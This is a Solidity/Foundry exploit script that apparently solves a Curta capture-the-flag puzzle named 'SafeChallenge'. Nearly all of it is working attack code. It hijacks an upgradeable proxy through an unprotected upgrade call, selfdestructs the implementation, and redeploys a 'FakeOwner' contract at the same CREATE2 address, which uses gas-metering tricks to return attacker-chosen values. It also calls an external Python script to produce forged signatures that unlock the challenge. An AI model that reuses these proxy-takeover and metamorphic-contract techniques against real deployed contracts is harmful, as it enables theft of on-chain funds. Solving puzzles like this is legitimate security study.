// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "src/SafeChallenge.sol";
import "src/SafeCurta.sol";
import "src/SafeProxy.sol";
import { console2 } from "forge-std/console2.sol";
import { stdJson } from "forge-std/StdJson.sol";

import {Create2} from "lib/openzeppelin-contracts/contracts/utils/Create2.sol";


contract SafeScriptSetup is Script {
    using stdJson for string;

    SafeCurta challenge_puzzle;

    function setUp() public {
        string memory json = vm.readFile("./deployment.json");
        challenge_puzzle = SafeCurta(vm.parseJsonAddress(json, ".curta_puzzle"));
    }

    function run() public {
        uint seed = challenge_puzzle.generate(vm.addr(vm.envUint("PLAYER_KEY")));

        vm.startBroadcast((vm.envUint("PLAYER_KEY")));
        SafeChallengeExploiter exploiter = new SafeChallengeExploiter();
        SafeChallenge challenge = SafeChallenge(challenge_puzzle.deploy(seed, address(exploiter)));
        vm.stopBroadcast();

        string memory data = "setup_data";
        data.serialize("exploiter", address(exploiter));
        string memory serialized = data.serialize("challenge", address(challenge));
        vm.writeJson(serialized, "./exploit.json");
    }
}

contract SafeScriptOne is Script {

    SafeChallenge challenge;

    SafeChallengeExploiter exploiter;

    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        string memory json = vm.readFile("./exploit.json");
        exploiter = SafeChallengeExploiter(vm.parseJsonAddress(json, ".exploiter"));
        challenge = SafeChallenge(vm.parseJsonAddress(json, ".challenge"));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PLAYER_KEY"));
        address proxy_impl = address(uint160(uint256(vm.load(address(challenge.proxy()), IMPLEMENTATION_SLOT)))); 
        exploiter.exploit_part_1(address(challenge), proxy_impl);  
        vm.stopBroadcast();
    }
}

contract SafeScriptTwo is Script {

    SafeChallenge challenge;

    SafeChallengeExploiter exploiter;

    bytes32 seed;

    function setUp() public {
        string memory json = vm.readFile("./exploit.json");
        exploiter = SafeChallengeExploiter(vm.parseJsonAddress(json, ".exploiter"));
        challenge = SafeChallenge(vm.parseJsonAddress(json, ".challenge"));
    }
    function run() public {
        seed = challenge.seed();

        bytes32 s1 = keccak256("jiz1");
        bytes32 s2 = keccak256("jiz2");
        bytes32 s3 = keccak256("jiz3");

        bytes32 s1_t = transform_s(s1);
        bytes32 s2_t = transform_s(s2);
        bytes32 s3_t = transform_s(s3);

        bytes32 message1_hash = keccak256(abi.encodePacked(seed, address(0xdead)));
        bytes32 message2_hash = keccak256(abi.encodePacked(seed, address(0xbeef)));

        ffi_pls(s1_t, s1, s2_t, s2, s3_t, s3, message2_hash, message1_hash);

        string memory exploit_1 = vm.readFile("./solved.0.json");
        string memory exploit_2 = vm.readFile("./solved.1.json");
        string memory exploit_3 = vm.readFile("./solved.2.json");

        ExploitData memory exp1 = generate_exploit_values(exploit_1);
        ExploitData memory exp2 = generate_exploit_values(exploit_2);
        ExploitData memory exp3 = generate_exploit_values(exploit_3);

        bytes32[3] memory rs = [exp1.r, exp2.r, exp3.r];
        bytes32[3] memory ss = [exp1.s, exp2.s, exp3.s];
        uint[3] memory p1s = [exp1.p1, exp2.p1, exp3.p1];
        uint[6] memory p2s = [exp1.p2, 0, exp2.p2, 0, exp3.p2, 0];
        address[3] memory owners = [exp1.owner, exp2.owner, exp3.owner];


        vm.startBroadcast(vm.envUint("PLAYER_KEY"));
        exploiter.exploit_part_2(rs, ss, p1s, p2s, owners);  
        vm.stopBroadcast();
    }

    struct ExploitData{
        bytes32 r;
        bytes32 s;
        uint256 p1;
        uint256 p2;
        address owner;
    }


    function generate_exploit_values(string memory exploit) internal returns (ExploitData memory){
        bytes32 message1_hash = keccak256(abi.encodePacked(seed, address(0xdead)));
        bytes32 message2_hash = keccak256(abi.encodePacked(seed, address(0xbeef)));

        uint r1 = vm.parseJsonUint(exploit, ".r1"); 
        uint s1 = vm.parseJsonUint(exploit, ".s1"); 

        uint r2 = vm.parseJsonUint(exploit, ".r2"); 
        uint s2 = vm.parseJsonUint(exploit, ".s2"); 

        uint256 orig_s = vm.parseJsonUint(exploit, ".orig_s");

        uint p2 = orig_s ^ s1;
        uint p1;
        unchecked{
            p1 = r2 - r1;
        }


        address owner = vm.parseJsonAddress(exploit, ".owner"); 
        // double check
        require(owner == ecrecover(message1_hash, 27, bytes32(r1), bytes32(s1)), "wtf1 >>");
        require(owner == ecrecover(message2_hash, 27, bytes32(r2), bytes32(s2)), "wtf2 >>");

        return ExploitData(bytes32(r1), bytes32(orig_s), p1, p2, owner);

    }

    function ffi_pls(bytes32 s, bytes32 orig_s, bytes32 s2, bytes32 orig_s2, bytes32 s3, bytes32 orig_s3, bytes32 msghash, bytes32 msghash_todo) internal returns (bytes memory){
        string[] memory cmd = new string[](14);
        cmd[0] = string("python3");
        cmd[1] = string("hack.py");
        cmd[2] = vm.toString(s);
        cmd[3] = vm.toString(orig_s);
        cmd[4] = vm.toString(msghash);
        cmd[5] = vm.toString(msghash_todo);

        cmd[6] = vm.toString(s2);
        cmd[7] = vm.toString(orig_s2);
        cmd[8] = vm.toString(msghash);
        cmd[9] = vm.toString(msghash_todo);

        cmd[10] = vm.toString(s3);
        cmd[11] = vm.toString(orig_s3);
        cmd[12] = vm.toString(msghash);
        cmd[13] = vm.toString(msghash_todo);

        return vm.ffi(cmd);
    }

    function transform_s(bytes32 _s) internal returns (bytes32) {
        return keccak256(abi.encodePacked(uint256(_s) ^ 0, seed));
    }
}

contract SafeScriptThree is Script { 

    SafeChallenge challenge;

    SafeChallengeExploiter exploiter;

    function setUp() public {
        string memory json = vm.readFile("./exploit.json");
        exploiter = SafeChallengeExploiter(vm.parseJsonAddress(json, ".exploiter"));
        challenge = SafeChallenge(vm.parseJsonAddress(json, ".challenge"));
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PLAYER_KEY"));
        exploiter.exploit_part_3();  
        vm.stopBroadcast();
    }
}

contract SafeChallengeExploiter {
    SafeChallenge challenge;

    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    BytecodeDeployerSource bytecode_source;
    Create2Deployer c2deployer;
    SafeProxy challenge_proxy;
    SafeProxy challenge_proxy_original_implementation;


    SafeProxy challenge_proxy_new_implementation;

    bytes32[3] internal r;
    bytes32[3] internal s;


    function exploit_part_1(address challenge_address, address implementation) public {
        challenge = SafeChallenge(challenge_address);
        BytecodeDeployerSource source = new BytecodeDeployerSource();
        bytecode_source = source;

        c2deployer = new Create2Deployer();

        challenge_proxy = challenge.proxy();
        challenge_proxy_original_implementation = SafeProxy(implementation);

        bytes memory bytechode_impl = address(challenge_proxy_original_implementation).code;
        source.set_bytecode(bytechode_impl);

        SafeProxy copied_proxy_impl = SafeProxy(c2deployer.deploy(0, bytes32(type(uint256).max), abi.encodePacked(type(ArbitraryBytecodeDeployer).creationCode, abi.encode(address(source), address(challenge_proxy_original_implementation)))));
        challenge_proxy_new_implementation = copied_proxy_impl;

        OnlySelfdestruct sd = new OnlySelfdestruct();
        bytes32[] memory whitelist = new bytes32[](1);
        whitelist[0] = address(sd).codehash;

        challenge_proxy.upgradeToAndCall(address(copied_proxy_impl), "");

        copied_proxy_impl.initialize(address(this), whitelist);
        //console.logBytes(address(challenge_proxy_new_implementation).code);       
        copied_proxy_impl.upgradeToAndCall(address(sd), "deet");
    }

    function exploit_part_2(bytes32[3] calldata _r, bytes32[3] calldata _s, uint[3] calldata p1, uint[6] calldata p2, address[3] calldata owners) public {
        FakeOwner fo = new FakeOwner();
        bytecode_source.set_bytecode(address(fo).code);
        c2deployer.deploy(0, bytes32(type(uint256).max), abi.encodePacked(type(ArbitraryBytecodeDeployer).creationCode, abi.encode(address(bytecode_source), address(challenge_proxy_original_implementation))));      

        FakeOwner exp = FakeOwner(address(challenge_proxy));


        for(uint i = 0; i < p1.length; ++i){
            exp.add_p1(p1[i]);
        }

        for(uint i = 0; i < p2.length; ++i){
            exp.add_p2(p2[i]);
        }

        for(uint i = 0; i < owners.length; ++i){
            exp.add_owner(owners[i]);
        }

        for(uint i = 0; i < 3; ++i){
            r[i] = _r[i];
            s[i] = _s[i];
        }
    }

    function exploit_part_3() public {
        challenge.unlock(r, s);
        require(challenge.isUnlocked());
    }
}

contract FakeOwner {

    address[] private _padding;
    address[] private _padding2;
    address[] private _padding3;
    address[] private _padding4;
    address[] private owners;
    uint256[] private p1s;
    uint256[] private p2s;

    function owner() external returns (address) {
        for(uint i = 0; i < owners.length; ++i){
            uint start = gasleft();
            address cur = owners[i];
            uint diff = start - gasleft();
            if(diff > 2100)return cur;
        }
        return address(0xdeadbabe);
    }

    function p1() external returns (uint256) {
        for(uint i = 0; i < p1s.length; ++i){
            uint start = gasleft();
            uint256 cur = p1s[i];
            uint diff = start - gasleft();
            if(diff > 2100)return cur;
        }
        return uint256(0x696969);
    }

    function p2() external returns (uint256) {
        for(uint i = 0; i < p2s.length; ++i){
            uint start = gasleft();
            uint cur = p2s[i];
            uint diff = start - gasleft();
            if(diff > 2100){
                return cur;
            }
        }
        return uint256(0x696969);
    }

    function add_owner(address _owner) public {
        owners.push(_owner);
    }

    function add_p1(uint256 _p1) public {
        p1s.push(_p1);
    }

    function add_p2(uint256 _p2) public {
        p2s.push(_p2);
    }
}

contract Create2Deployer {

    function deploy(uint value, bytes32 seed, bytes memory arguments) public returns (address) {
        return Create2.deploy(value, seed, arguments);
    }
}

contract OnlySelfdestruct is Test {

    fallback() external {
        selfdestruct(payable(address(0x0)));
    }
}


contract ArbitraryBytecodeDeployer {

    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address source, address proxy_impl) {
        bytes memory bytechode = BytecodeDeployerSource(source).bytecode(); 
        assembly {
            sstore(IMPLEMENTATION_SLOT, proxy_impl)
            return(add(bytechode, 32), mload(bytechode))
        }
    }
}


contract BytecodeDeployerSource {
    bytes public bytecode;

    function set_bytecode(bytes memory _bytecode) public {
        bytecode = _bytecode;
    }
}

